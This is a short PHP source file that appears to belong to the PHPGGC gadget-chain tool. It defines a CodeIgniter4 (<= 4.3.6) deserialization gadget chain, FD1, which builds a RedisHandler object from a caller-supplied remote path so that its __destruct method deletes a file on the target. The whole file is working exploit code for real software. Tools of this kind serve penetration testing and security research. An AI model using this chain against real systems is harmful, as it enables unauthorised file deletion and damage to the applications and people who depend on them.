<?php

namespace GadgetChain\CodeIgniter4;

class FD1 extends \PHPGGC\GadgetChain\FileDelete
{
    public static $version = '<= 4.3.6';
    public static $vector = '__destruct';
    public static $author = 'coiffeur';
    public static $information = '';

    public function generate(array $parameters)
    {
        return new \CodeIgniter\Cache\Handlers\RedisHandler($parameters['remote_path']);
    }
}